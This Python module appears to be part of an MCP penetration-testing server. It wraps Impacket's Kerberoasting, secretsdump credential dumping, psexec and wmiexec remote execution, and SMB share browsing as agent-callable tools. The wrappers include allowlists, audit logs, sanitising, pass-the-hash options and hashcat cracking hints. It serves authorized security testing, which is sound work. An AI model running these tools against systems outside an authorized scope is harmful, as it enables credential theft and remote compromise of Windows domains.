"""Impacket GetUserSPNs Kerberoasting tool wrapper.

WARNING: Kerberoasting is a high-risk Active Directory attack technique.
It requests Kerberos TGS tickets for service accounts and is detectable
by modern EDR, SIEM solutions, and Windows Event ID 4769.
Requires explicit written authorization from the target domain owner.
"""

from __future__ import annotations

import re
import shutil
import time

import structlog
from fastmcp import Context

from tengu.config import get_config
from tengu.executor.process import run_command
from tengu.executor.registry import resolve_tool_path
from tengu.security.allowlist import make_allowlist_from_config
from tengu.security.audit import get_audit_logger
from tengu.security.rate_limiter import rate_limited
from tengu.security.sanitizer import sanitize_domain, sanitize_free_text, sanitize_target

logger = structlog.get_logger(__name__)

# TGS ticket hash pattern (Kerberoast hashcat format)
_TGS_HASH_PATTERN = re.compile(r"\$krb5tgs\$\d+\$.*?\$.*?\$[a-fA-F0-9]+\$[a-fA-F0-9]+")

# SPN line pattern
_SPN_PATTERN = re.compile(r"ServicePrincipalName\s+(.+?)(?:\s{2,}|\t)")


async def impacket_kerberoast(
    ctx: Context,
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:
    """Perform Kerberoasting using Impacket GetUserSPNs.

    Requests TGS tickets for service accounts with SPNs registered in Active Directory.
    The resulting hashes can be cracked offline with hashcat (-m 13100) or john.

    Args:
        target: Domain Controller IP address.
        domain: Active Directory domain name (e.g. corp.local).
        username: Valid domain username for authentication.
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override default timeout.

    Returns:
        Kerberoastable service accounts, SPNs, and TGS hashes for offline cracking.

    WARNING:
        - Kerberoasting is detectable by modern EDR and SIEM solutions.
        - Requires valid domain credentials.
        - Target must be in tengu.toml [targets].allowed_hosts.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    # Audit params — redact credentials
    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
    }

    # Allowlist check
    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-GetUserSPNs", target, str(exc))
        raise

    # Resolve tool path — try GetUserSPNs.py first, then impacket-GetUserSPNs
    tool_name: str
    tool_path: str
    if shutil.which("GetUserSPNs.py"):
        tool_name = "GetUserSPNs.py"
        tool_path = resolve_tool_path("GetUserSPNs.py")
    else:
        tool_name = "impacket-GetUserSPNs"
        tool_path = resolve_tool_path("impacket-GetUserSPNs")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    # Build credential argument
    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    args: list[str] = [
        tool_path,
        cred_arg,
        "-dc-ip",
        target,
        "-request",
        "-outputfile",
        "/dev/stdout",
    ]

    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    logger.warning(
        "Kerberoasting initiated — this operation is detectable by domain controllers (Event ID 4769)",
        target=target,
        domain=domain,
        username=safe_username,
    )

    await ctx.report_progress(0, 100, f"Starting Kerberoasting against {domain} DC {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing Kerberoasting results...")

    parsed = _parse_kerberoast_output(stdout)

    await ctx.report_progress(100, 100, "Kerberoasting complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    hashcat_hint = (
        "Crack offline with: hashcat -m 13100 hashes.txt wordlist.txt"
        if parsed["tgs_hashes"]
        else ""
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "command": " ".join(args),
        "duration_seconds": round(duration, 2),
        "kerberoastable_accounts": len(parsed["accounts"]),
        "accounts": parsed["accounts"],
        "tgs_hashes": parsed["tgs_hashes"],
        "hashcat_mode": "13100 (Kerberos 5 TGS-REP etype 23)",
        "hashcat_hint": hashcat_hint,
        "warning": "Kerberoasting generates Windows Event ID 4769 on the Domain Controller.",
        "raw_output_excerpt": stdout[-4000:] if len(stdout) > 4000 else stdout,
    }


def _parse_kerberoast_output(output: str) -> dict:
    """Parse Impacket GetUserSPNs output for TGS hashes and account information."""
    accounts: list[dict] = []
    tgs_hashes: list[str] = []
    current_account: dict[str, object] = {}

    for line in output.splitlines():
        line = line.strip()
        if not line:
            continue

        # TGS hash line — starts with $krb5tgs$
        if line.startswith("$krb5tgs$") or _TGS_HASH_PATTERN.match(line):
            tgs_hashes.append(line)
            if current_account:
                current_account["tgs_hash"] = line
                accounts.append(current_account)
                current_account = {}
            continue

        # SPN line from the tabular output
        # Format: ServicePrincipalName  Name  MemberOf  PasswordLastSet  LastLogon  Delegation
        parts = re.split(r"\s{2,}|\t", line)
        if len(parts) >= 2:
            spn = parts[0].strip()
            account_name = parts[1].strip() if len(parts) > 1 else ""
            # Filter out header lines
            if spn and account_name and spn != "ServicePrincipalName" and spn != "-":
                current_account = {
                    "spn": spn,
                    "account": account_name,
                    "member_of": parts[2].strip() if len(parts) > 2 else "",
                    "password_last_set": parts[3].strip() if len(parts) > 3 else "",
                    "tgs_hash": None,
                }

    # Flush any trailing account without a TGS hash
    if current_account and current_account.get("spn"):
        accounts.append(current_account)

    # If hashes were found but accounts weren't parsed structurally, create minimal entries
    if tgs_hashes and not accounts:
        for i, h in enumerate(tgs_hashes):
            accounts.append(
                {
                    "spn": f"unknown-spn-{i + 1}",
                    "account": "unknown",
                    "tgs_hash": h,
                }
            )

    return {
        "accounts": accounts,
        "tgs_hashes": tgs_hashes,
    }


# ─── secretsdump ─────────────────────────────────────────────────────────────


async def impacket_secretsdump(
    ctx: Context,
    target: str,
    domain: str,
    username: str,
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:
    """Dump SAM, NTDS, and LSA secrets from a Windows target using Impacket secretsdump.

    Extracts credential hashes from the SAM database (local accounts), NTDS.dit
    (domain accounts), and LSA secrets (service account passwords, cached credentials).

    Args:
        target: Target IP address or hostname.
        domain: Domain name (use "." for local accounts).
        username: Username for authentication.
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override scan timeout in seconds.

    Returns:
        Extracted credential hashes organized by type (SAM, NTDS, LSA secrets).

    WARNING:
        - This is a destructive/intrusive operation detectable by EDR solutions.
        - Requires admin credentials on the target system.
        - Target must be in tengu.toml [targets].allowed_hosts.
        - Requires explicit human authorization.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
    }

    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-secretsdump", target, str(exc))
        raise

    tool_name: str
    tool_path_str: str
    if shutil.which("secretsdump.py"):
        tool_name = "secretsdump.py"
        tool_path_str = resolve_tool_path("secretsdump.py")
    else:
        tool_name = "impacket-secretsdump"
        tool_path_str = resolve_tool_path("impacket-secretsdump")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    args: list[str] = [tool_path_str, cred_arg, target]
    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    logger.warning(
        "secretsdump initiated — this operation dumps credentials from the target system",
        target=target,
        domain=domain,
        username=safe_username,
    )

    await ctx.report_progress(0, 100, f"Starting secretsdump on {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing secretsdump results...")

    parsed = _parse_secretsdump_output(stdout)

    await ctx.report_progress(100, 100, "secretsdump complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "duration_seconds": round(duration, 2),
        "sam_hashes_count": len(parsed["sam_hashes"]),
        "ntds_hashes_count": len(parsed["ntds_hashes"]),
        "lsa_secrets_count": len(parsed["lsa_secrets"]),
        "sam_hashes": parsed["sam_hashes"],
        "ntds_hashes": parsed["ntds_hashes"],
        "lsa_secrets": parsed["lsa_secrets"],
        "hashcat_hint": "Crack NTLM hashes with: hashcat -m 1000 hashes.txt wordlist.txt",
        "warning": "This operation is detectable by EDR solutions.",
        "raw_output_excerpt": stdout[-4000:] if len(stdout) > 4000 else stdout,
    }


def _parse_secretsdump_output(output: str) -> dict:
    """Parse Impacket secretsdump output into SAM, NTDS, and LSA secret buckets."""
    sam_hashes: list[str] = []
    ntds_hashes: list[str] = []
    lsa_secrets: list[str] = []

    section = "unknown"
    for line in output.splitlines():
        line = line.strip()
        if not line:
            continue
        if "[*] Dumping local SAM hashes" in line:
            section = "sam"
        elif "[*] Dumping Domain Credentials" in line or "[*] Using the DRSUAPI" in line:
            section = "ntds"
        elif "[*] Dumping LSA Secrets" in line:
            section = "lsa"
        elif line.startswith("[*]") or line.startswith("[+]") or line.startswith("[-]"):
            continue
        elif ":" in line and section == "sam":
            sam_hashes.append(line)
        elif ":::" in line and section == "ntds":
            ntds_hashes.append(line)
        elif section == "lsa" and line:
            lsa_secrets.append(line)

    return {
        "sam_hashes": sam_hashes[:50],
        "ntds_hashes": ntds_hashes[:100],
        "lsa_secrets": lsa_secrets[:20],
    }


# ─── psexec ───────────────────────────────────────────────────────────────────


async def impacket_psexec(
    ctx: Context,
    target: str,
    domain: str,
    username: str,
    command: str,
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:
    """Execute a command remotely on a Windows host via SMB using Impacket psexec.

    psexec uploads a service binary to the target via SMB admin shares, creates
    and starts a Windows service, and executes the specified command.

    Args:
        target: Target IP address or hostname.
        domain: Domain name (use "." for local accounts).
        username: Username for authentication.
        command: Command to execute on the remote host (e.g. "whoami").
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override scan timeout in seconds.

    Returns:
        Command execution result with output.

    WARNING:
        - This is a destructive operation that creates a service on the target.
        - Highly detectable — creates Windows Event IDs 7045, 4688.
        - Requires admin credentials and SMB access (port 445).
        - Requires explicit human authorization.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    safe_command = re.sub(r"[;&|`\r\n]", "", command)[:512]
    if not safe_command:
        raise ValueError("command cannot be empty")

    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
        "command": safe_command,
    }

    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-psexec", target, str(exc))
        raise

    tool_name: str
    tool_path_str: str
    if shutil.which("psexec.py"):
        tool_name = "psexec.py"
        tool_path_str = resolve_tool_path("psexec.py")
    else:
        tool_name = "impacket-psexec"
        tool_path_str = resolve_tool_path("impacket-psexec")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    args: list[str] = [tool_path_str, cred_arg, f"//{target}", safe_command]
    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    logger.warning(
        "psexec initiated — creates a Windows service on the target (Event IDs 7045, 4688)",
        target=target,
        domain=domain,
        username=safe_username,
    )

    await ctx.report_progress(0, 100, f"Starting psexec on {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing psexec output...")

    parsed = _parse_psexec_output(stdout)

    await ctx.report_progress(100, 100, "psexec complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "command": safe_command,
        "duration_seconds": round(duration, 2),
        "output": parsed["output"],
        "warning": "psexec creates Windows Event IDs 7045 and 4688 — highly detectable.",
        "raw_output_excerpt": stdout[-3000:] if len(stdout) > 3000 else stdout,
    }


def _parse_psexec_output(output: str) -> dict:
    """Parse Impacket psexec output, filtering out status/connection messages."""
    lines = [line.strip() for line in output.splitlines() if line.strip()]
    output_lines = [
        line
        for line in lines
        if not line.startswith("[*]") and not line.startswith("[+]") and not line.startswith("[-]")
    ]
    return {"output": "\n".join(output_lines), "lines": output_lines[:50]}


# ─── wmiexec ──────────────────────────────────────────────────────────────────


async def impacket_wmiexec(
    ctx: Context,
    target: str,
    domain: str,
    username: str,
    command: str,
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:
    """Execute a command remotely on a Windows host via WMI using Impacket wmiexec.

    wmiexec uses Windows Management Instrumentation (WMI) for remote execution,
    which is stealthier than psexec as it does not create a service.

    Args:
        target: Target IP address or hostname.
        domain: Domain name (use "." for local accounts).
        username: Username for authentication.
        command: Command to execute on the remote host.
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override scan timeout in seconds.

    Returns:
        Command execution result with output.

    WARNING:
        - Requires admin credentials and WMI access (port 135/445).
        - Generates Windows Event ID 4688 and WMI activity logs.
        - Requires explicit human authorization.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    safe_command = re.sub(r"[;&|`\r\n]", "", command)[:512]
    if not safe_command:
        raise ValueError("command cannot be empty")

    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
        "command": safe_command,
    }

    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-wmiexec", target, str(exc))
        raise

    tool_name: str
    tool_path_str: str
    if shutil.which("wmiexec.py"):
        tool_name = "wmiexec.py"
        tool_path_str = resolve_tool_path("wmiexec.py")
    else:
        tool_name = "impacket-wmiexec"
        tool_path_str = resolve_tool_path("impacket-wmiexec")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    args: list[str] = [tool_path_str, cred_arg, target, safe_command]
    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    logger.warning(
        "wmiexec initiated — generates WMI activity logs and Event ID 4688",
        target=target,
        domain=domain,
        username=safe_username,
    )

    await ctx.report_progress(0, 100, f"Starting wmiexec on {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing wmiexec output...")

    parsed = _parse_wmiexec_output(stdout)

    await ctx.report_progress(100, 100, "wmiexec complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "command": safe_command,
        "duration_seconds": round(duration, 2),
        "output": parsed["output"],
        "warning": "wmiexec generates WMI activity logs — detectable by advanced EDR.",
        "raw_output_excerpt": stdout[-3000:] if len(stdout) > 3000 else stdout,
    }


def _parse_wmiexec_output(output: str) -> dict:
    """Parse Impacket wmiexec output, filtering out status/connection messages."""
    lines = [line.strip() for line in output.splitlines() if line.strip()]
    output_lines = [
        line
        for line in lines
        if not line.startswith("[*]") and not line.startswith("[+]") and not line.startswith("[-]")
    ]
    return {"output": "\n".join(output_lines), "lines": output_lines[:50]}


# ─── smbclient ────────────────────────────────────────────────────────────────


async def impacket_smbclient(
    ctx: Context,
    target: str,
    domain: str,
    username: str,
    action: str = "list_shares",
    share: str = "",
    password: str = "",
    hashes: str = "",
    timeout: int | None = None,
) -> dict:
    """Browse and interact with SMB shares using Impacket smbclient.

    Enumerates available shares and optionally lists files within a specific share.

    Args:
        target: Target IP address or hostname.
        domain: Domain name (use "." for local accounts).
        username: Username for authentication.
        action: Action to perform — "list_shares" (default) or "list_files".
        share: Share name for list_files action (e.g. "C$", "ADMIN$", "IPC$").
        password: Password for authentication (redacted in logs).
        hashes: NTLM hash for pass-the-hash (format: LM:NT). Alternative to password.
        timeout: Override scan timeout in seconds.

    Returns:
        SMB shares list or file listing within a specified share.

    Note:
        - Target must be in tengu.toml [targets].allowed_hosts.
        - Requires valid credentials with appropriate share permissions.
    """
    cfg = get_config()
    audit = get_audit_logger()

    target = sanitize_target(target)
    domain = sanitize_domain(domain)
    safe_username = sanitize_free_text(username, field="username", max_length=256)
    safe_password = (
        sanitize_free_text(password, field="password", max_length=512) if password else ""
    )
    safe_hashes = sanitize_free_text(hashes, field="hashes", max_length=128) if hashes else ""

    if action not in ("list_shares", "list_files"):
        action = "list_shares"
    safe_share = re.sub(r"[^a-zA-Z0-9_$\-]", "", share)[:64] if share else ""

    params: dict[str, object] = {
        "target": target,
        "domain": domain,
        "username": safe_username,
        "password": "[REDACTED]" if safe_password else "",
        "hashes": "[REDACTED]" if safe_hashes else "",
        "action": action,
        "share": safe_share,
    }

    allowlist = make_allowlist_from_config()
    try:
        allowlist.check(target)
    except Exception as exc:
        await audit.log_target_blocked("impacket-smbclient", target, str(exc))
        raise

    tool_name: str
    tool_path_str: str
    if shutil.which("smbclient.py"):
        tool_name = "smbclient.py"
        tool_path_str = resolve_tool_path("smbclient.py")
    else:
        tool_name = "impacket-smbclient"
        tool_path_str = resolve_tool_path("impacket-smbclient")

    effective_timeout = timeout or cfg.tools.defaults.scan_timeout

    cred_arg = f"{domain}/{safe_username}"
    if safe_password:
        cred_arg = f"{domain}/{safe_username}:{safe_password}"

    if action == "list_shares":
        smb_command = "shares"
    elif action == "list_files" and safe_share:
        smb_command = f"use {safe_share}; ls"
    else:
        smb_command = "shares"

    args: list[str] = [
        tool_path_str,
        cred_arg,
        target,
        "-c", smb_command,
    ]
    if safe_hashes:
        args.extend(["-hashes", safe_hashes])

    await ctx.report_progress(0, 100, f"Starting smbclient on {target}...")

    async with rate_limited("impacket"):
        start = time.monotonic()
        await audit.log_tool_call(tool_name, target, params, result="started")

        try:
            stdout, stderr, returncode = await run_command(args, timeout=effective_timeout)
        except Exception as exc:
            await audit.log_tool_call(tool_name, target, params, result="failed", error=str(exc))
            raise

        duration = time.monotonic() - start

    await ctx.report_progress(80, 100, "Parsing smbclient output...")

    parsed = _parse_smbclient_output(stdout)

    await ctx.report_progress(100, 100, "smbclient complete")
    await audit.log_tool_call(
        tool_name, target, params, result="completed", duration_seconds=duration
    )

    return {
        "tool": tool_name,
        "target": target,
        "domain": domain,
        "action": action,
        "share": safe_share,
        "duration_seconds": round(duration, 2),
        "shares": parsed["shares"],
        "files": parsed["files"],
        "raw_output_excerpt": stdout[-3000:] if len(stdout) > 3000 else stdout,
    }


def _parse_smbclient_output(output: str) -> dict:
    """Parse Impacket smbclient output into shares and files lists."""
    shares: list[str] = []
    files: list[str] = []

    for line in output.splitlines():
        line = line.strip()
        if not line or line.startswith("[*]"):
            continue
        if not line.startswith("["):
            if "\t" in line or "  " in line:
                files.append(line)
            else:
                shares.append(line)

    return {"shares": shares[:50], "files": files[:100]}
